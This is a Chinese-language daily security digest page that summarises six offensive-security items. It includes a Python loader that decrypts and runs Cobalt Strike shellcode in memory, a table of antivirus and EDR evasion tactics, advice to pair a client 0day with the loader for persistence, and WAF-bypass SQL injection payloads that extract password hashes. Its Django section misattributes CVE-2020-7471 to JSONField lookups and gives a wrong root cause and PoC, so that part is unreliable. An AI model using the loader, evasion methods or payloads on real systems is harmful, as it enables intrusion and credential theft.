---
title: 每日安全看点 2020-02-13
description: 汇总 2020 年 2 月 13 日每日安全看点，涵盖 XSS 扫描器开发、Pwn 堆入门、Django SQL 注入 POC、移动端入侵检查清单、CS
  Shellcode 免杀及 WAF 绕过 SQL 注入技巧
category: ai-security
tags:
- 每日安全看点
- XSS扫描器
- Pwn堆漏洞
- Django
- SQL注入
- CVE-2020-7471
- 移动端安全
- 免杀技术
- Cobalt Strike
- WAF绕过
- 2020年2月
date: 2020-02-13
updated: '2026-11-12'
---

## 概述

本期每日安全看点收录 2020 年 2 月 13 日的六个安全技术主题，涵盖 Web 安全工具开发、二进制漏洞利用基础、框架漏洞复现、移动端安全检查清单、红队免杀技术以及 WAF 绕过实战技巧。

## XSS 扫描器成长记

**来源**：[Seebug Paper 1119](https://paper.seebug.org/1119/)

详细记录 XSS 扫描器的设计演进过程，涵盖从基础爬虫到智能检测引擎的构建思路：

- **爬虫模块**：处理现代 Web 应用的动态路由、单页应用（SPA）遍历及认证态维持
- **检测引擎**：基于语义分析的 Payload 生成策略，结合上下文感知的注入点识别
- **去重与降噪**：利用 DOM 差异比对与行为特征聚类减少误报
- **扩展性设计**：插件化架构支持自定义检测规则与渗透测试框架集成

> 该文章为安全工具开发提供了工程化视角的参考，适合想深入理解自动化漏洞扫描原理的研究人员。

## Pwn 堆入门（一）

**来源**：[阿里云先知社区 t/6087](https://xz.aliyun.com/t/6087)

面向初学者的堆漏洞利用基础教程，系统梳理 glibc malloc 核心机制：

### 核心概念
- **Chunk 结构**：`prev_size`、`size`、`fd`、`bk`、`fd_nextsize`、`bk_nextsize` 字段含义与标志位（`PREV_INUSE`、`IS_MMAPPED`、`NON_MAIN_ARENA`）
- **内存管理单元**：Arena、Heap、Thread Local Cache (tcache) 的层级关系
- **Bin 分类**：Fastbin、Unsorted Bin、Small Bin、Large Bin 的链表维护策略与取块流程

### 基础利用技术
- **Heap Overflow**：修改相邻 Chunk 元数据实现任意地址写
- **Use-After-Free (UAF)**：释放后重复引用导致类型混淆或函数指针劫持
- **Double Free**：触发 `fastbin_double_free` 检查绕过或构造 fake chunk
- **Off-by-One/Off-by-Null**：利用单字节溢出修改 `size` 字段或 `PREV_INUSE` 位

> 该教程为后续 House of Spirit、House of Force、Tcache Poisoning 等高级技巧奠定基础，建议配合 `pwndbg`/`gef` 动态调试加深理解。

## Django SQL 注入漏洞复现 (CVE-2020-7471)

**来源**：[Saferman/CVE-2020-7471](https://github.com/Saferman/CVE-2020-7471/)

### 漏洞详情
- **影响版本**：Django 2.2 < 2.2.10、3.0 < 3.0.3
- **漏洞组件**：`django.contrib.postgres.fields.JSONField` / `HStoreField` 及 `KeyTransform`/`KeyTextTransform` 查找
- **根因**：`KeyTransform` 生成 SQL 时未对键名进行充分转义，攻击者可控制 `filter(key__contains=...)` 等查找参数注入 SQL 片段

### 利用条件
1. 应用使用 PostgreSQL 后端
2. 模型定义 `JSONField` 或 `HStoreField`
3. 视图直接将用户输入传递给 `__contains`、`__has_key` 等查找

### POC 关键片段
```python
# 触发注入的查询构造
Model.objects.filter(data__contains={"key": "payload' OR 1=1;--"}) 
# 生成 SQL: ... WHERE data @> '{"key": "payload' OR 1=1;--"}'
```

### 缓解建议
- 升级至 Django 2.2.10 / 3.0.3 及以上版本
- 避免直接将未校验用户输入用于 ORM 复杂查找参数
- 启用数据库层面的参数化查询审计

> 该漏洞属于 ORM 查找参数转义不当类，与 [[daily-security-digest-20200227]] 中提到的 Django PostgreSQL SQL 注入同属框架层注入风险。

## 移动端入侵检查清单

**来源**：[randorisec/MobileHackingCheatSheet](https://github.com/randorisec/MobileHackingCheatSheet)

结构化的移动端渗透测试/应急响应检查清单，按攻击面分类：

### Android 篇
| 类别 | 关键检查项 |
|------|------------|
| **静态分析** | `AndroidManifest.xml` 权限/导出组件、网络安全配置、硬编码密钥/证书、本地存储敏感数据 |
| **动态分析** | Frida/Xposed Hook 关键 API、SSL Pinning 绕过、IPC 通信监听、共享偏好/数据库审计 |
| **Root/提权** | `su` 二进制检测、Magisk Hide 绕过、内核漏洞利用 (CVE-2019-2215 等) |
| **逆向工程** | 反混淆/加壳识别、Native 库 (JNI) 分析、DEX 解包与字节码审计 |

### iOS 篇
| 类别 | 关键检查项 |
|------|------------|
| **静态分析** | `Info.plist` 权限/URL Scheme、Entitlements、Keychain 访问组、二进制加密状态 |
| **动态分析** | Cycript/Frida 运行时注入、SSL Pinning 绕过、Keychain 转储、Pasteboard 监听 |
| **越狱/提权** | 越狱检测绕过、内核漏洞 (checkm8 等)、`task_for_pid` 权限滥用 |
| **逆向工程** | `class-dump`/`class-dump-dyld`、Swift/Objective-C 运行时分析、Mach-O 解析 |

### 通用网络/后端
- API 端点枚举与鉴权测试
- 证书透明度日志 (CT Log) 子域名发现
- 移动端专用 API 版本控制与降级攻击

> 该清单适合渗透测试人员建立标准化移动端测试流程，亦可作为企业移动应用安全自查基线。

## 利用 Python 免杀 Cobalt Strike Shellcode

**来源**：[微信公众号文章](https://mp.weixin.qq.com/s/esZJl8jNXYjuewZi0PAyxA)

### 核心思路
利用 Python 的动态特性与丰富的库生态，将 CS 生成的原始 Shellcode 经过多层编码/加密，配合进程注入或内存执行技术绕过静态特征匹配与行为监控。

### 典型流程
1. **Shellcode 获取**：CS `scripted` 模式生成原始二进制 (`raw` 格式)
2. **多层编码**：Base64 → AES/RSA 加密 → 自定义字节置换/异或 → 图片/文本隐写
3. **加载器实现**：
   ```python
   import ctypes, base64
   from Crypto.Cipher import AES
   
   # 解密还原
   shellcode = decrypt(encoded_payload)
   # 内存分配 + 执行
   ptr = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)
   ctypes.windll.kernel32.RtlMoveMemory(ptr, shellcode, len(shellcode))
   ctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, 0, 0)
   ```
4. **免杀增强**：
   - **进程空心化/模块跨越**：`CreateProcess` + `NtUnmapViewOfSection` + `WriteProcessMemory`
   - **早期鸟/APC 注入**：利用线程 APC 队列异步执行
   - **系统调用直接调用 (SysWhispers)**：绕过用户态 Hook
   - **PEB/TEB 走私**：隐藏导入表与字符串特征

### 对抗检测点
| 检测层面 | 绕过策略 |
|----------|----------|
| **静态 AV** | 多态编码、控制流平坦化、字符串加密、去除 PE 特征 |
| **动态沙箱** | 环境感知 (进程/驱动/注册表)、延时执行、人机交互触发 |
| **EDR/HOOK** | 直接系统调用、重新映射 `ntdll.dll`、内联 Hook 清除 |
| **内存扫描** | 堆/栈分配替代 `VirtualAlloc`、权限切换 (RW→RX)、内存分块 |

> 实战中建议结合 [[wechat-pc-v8-rce-0day-analysis]] 等客户端漏洞实现初始访问，再部署免杀 Loader 实现持久化。

## t00ls 过狗 SQL 注入技巧（WAF 绕过）

**来源**：t00ls 社区分享

针对 “安全狗” 等国内主流 WAF 的 SQL 注入绕过 Payload 实录，利用 MySQL 版本特性注释语法 (`/*!...*/`) 打乱关键词匹配。

### 核心 Payload
```sql
-- 基础联合查询绕过
id=-1'/*!union*//*!61692*//*!*/\*//*!select*//*1,user(),3%23

-- 获取指定用户密码哈希
id=-1'/*!union*//*!61692*//*!*/\*//*!select*//*1,password,3/**/from/**/users/**/where/**/username='Dummy'%23
```

### 语法解析
| 片段 | 作用 |
|------|------|
| `/*!union*/` | MySQL 解析为 `union`，WAF 正则难以匹配带注释的关键词 |
| `/*!61692*/` | 版本条件注释：仅 MySQL ≥ 6.1.692 执行，进一步干扰特征库 |
| `/*!*/` | 空版本注释，作为分隔符打断关键词连续性 |
| `\*/\*!select*//*` | 利用注释闭合与重开插入干扰字符，破坏 WAF 词法分析 |
| `/**/` | 标准注释替代空格，绕过空格过滤规则 |

### 通用化绕过模板
```sql
/*!<keyword>*/          -- 关键词包裹
/*!<version><keyword>*/ -- 版本条件 + 关键词
/*!*/\*//*!<keyword>*/  -- 空注释分隔 + 干扰字符
%23 / --+ / %00         -- 注释截断后续 SQL
```

### 防御视角建议
- 启用 WAF 语义分析引擎而非纯正则匹配
- 数据库层面开启 `sql_mode=ANSI_QUOTES,NO_BACKSLASH_ESCAPES` 限制注释语法
- 应用层采用参数化查询/ORM 彻底消除拼接注入面

> 此类技巧属于“语法层混淆”，随着 WAF 引入 AST 解析逐渐失效，根本对策仍是规范化开发与数据库最小权限原则。

## 关联页面

- [[daily-security-digest-20200214]] — 翌日看点：Android 逆向、angr 自动化漏洞利用、Safari RCE 等
- [[daily-security-digest-20200217]] — 后续看点：钓鱼攻击、ARM ROP、云环境 SSRF 检测等
- [[daily-security-digest-20200227]] — 涉及 Django PostgreSQL SQL 注入、微盟删库事故等
- [[cve-digest-20200426]] — 同期 CVE 聚合：Chrome V8 堆溢出、Firefox XSS 等
- [[java-deserialization-fundamentals]] — Java 反序列化基础，对比 Python 免杀 Loader 的内存执行原理
- [[spring-boot-devtools-deserialization-rce]] — Spring Boot 弱默认密钥导致的反序列化 RCE，同属框架层漏洞利用链
- [[frp内网渗透应用]] — 内网穿透隧道技术，常配合 CS 免杀 Loader 实现 C2 通信隐蔽

## 参考资源汇总

| 主题 | 链接 |
|------|------|
| XSS 扫描器成长记 | https://paper.seebug.org/1119/ |
| Pwn 堆入门一 | https://xz.aliyun.com/t/6087 |
| Django CVE-2020-7471 POC | https://github.com/Saferman/CVE-2020-7471/ |
| 移动端入侵检查清单 | https://github.com/randorisec/MobileHackingCheatSheet |
| Python 免杀 CS Shellcode | https://mp.weixin.qq.com/s/esZJl8jNXYjuewZi0PAyxA |
| t00ls 过狗 SQLi | 社区原创 Payload（见正文） |

---
*页面生成时间：2025-08-23 | 整理自 2020-02-13 每日安全看点原文*

## 来源

- [0th3rs安全团队-201911-202204_082](../sources/0th3rs安全团队-201911-202204_082.md)
